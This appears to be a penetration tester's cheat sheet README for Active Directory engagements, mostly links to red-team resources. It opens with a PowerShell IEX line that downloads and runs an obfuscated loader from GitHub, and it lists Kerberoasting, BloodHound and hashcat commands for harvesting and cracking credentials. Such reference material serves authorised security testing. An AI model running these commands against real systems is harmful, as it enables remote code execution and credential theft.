### Legitimate files for security audit

$key need to be set

```
IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_LOAD_Menu.ps1')
```

# CYBER CHEAT SHEET

Global Ressources
---
https://viperone.gitbook.io/pentest-everything

https://book.hacktricks.xyz/

https://atomicredteam.io/atomics/

https://github.com/S3cur3Th1sSh1t/

Kiosk evasion
---
```
file://c:/windows/system32/calc.exe
\\127.0.0.1\c$
```

Recent user activity
---
```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
```

Url file attack
---
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack

https://github.com/mdsecactivebreach/Farmer

https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/


KALI files transfert
---
```
python -m http.server
```
https://haveibeenpwned.com

https://breachdirectory.org


Sysvol
---
```
\\mon-domaine.fr\sysvol
```


Password in GPO
---
![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)


BloodHound
---
```
bloodhound-python -d domain -u username@domain -p password -c all -ns domain_controller_ip -v
sudo apt install bloodhound
sudo neo4j console
http://localhost:7474/
(neo4j/neo4j)
bloodhound
```
https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f


ADMiner
---
```
pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
reopen shell ;-)
AD-miner -c -cf My_Report -u neo4j -p mypassword
```
https://github.com/Mazars-Tech/AD_Miner




NTLM
---
https://www.scip.ch/en/?labs.20210909


Kerberos
---

https://beta.hackndo.com/kerberos/

https://france.devoteam.com/paroles-dexperts/la-securite-des-protocoles-dauthentification-ntlm-et-kerberos-en-environnement-active-directory/

https://www.thibautprobst.fr/fr/posts/kerberos/

![image](https://github.com/TikTakTech/Salsa/assets/114105972/aa55712f-5bc3-4a52-a71f-70b1ee2298ad)


Kerberoasting
---
```
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
impacket-GetUserSPNs 'mondomaine.fr/mon.user:monpassword' -outputfile kerberoastable.txt -dc-ip X.X.X.X
hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
```
/!\ Windows/Linux encodage -> ~~0xOD~~ OxOA 

https://atomicredteam.io/credential-access/T1558.003/

https://github.com/cyberark/RiskySPN

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

https://www.youtube.com/watch?v=ycNadGeq03E

https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1

  
MEMCM - PXE
---
https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments

https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images

https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps

https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe

https://www.acceis.fr/sattaquer-aux-images-pxe

https://github.com/wavestone-cdt/powerpxe

https://tryhackme.com/r/room/breachingad


Linux Toolkit
---
https://korben.info/outils-crise-linux-indispensables-pros-it.html

https://www.brendangregg.com/blog/2024-03-24/linux-crisis-tools.html

<br/><br/>
